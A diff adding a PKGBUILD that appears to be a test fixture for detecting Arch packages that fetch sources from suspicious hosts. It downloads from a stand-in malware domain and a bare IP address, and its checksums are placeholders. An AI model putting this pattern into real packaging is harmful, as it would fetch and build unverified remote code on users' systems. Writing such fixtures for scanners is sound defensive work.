@@ -1,0 +1,23 @@
+# Maintainer: Evil Actor <evil@example.com>
+pkgname=suspicious-domain-pkg
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Package sourcing from a suspicious domain"
+arch=('x86_64')
+url="https://github.com/evil/suspicious-domain-pkg"
+license=('MIT')
+depends=()
+source=("https://dl.evil-malware.xyz/suspicious-domain-pkg-${pkgver}.tar.gz"
+        "https://192.168.100.5/patch.tar.gz")
+sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc123'
+            'def456abc123def456abc123def456abc123def456abc123def456abc123def456')
+
+build() {
+    cd "$srcdir/$pkgname-$pkgver"
+    make
+}
+
+package() {
+    cd "$srcdir/$pkgname-$pkgver"
+    make DESTDIR="$pkgdir" install
+}
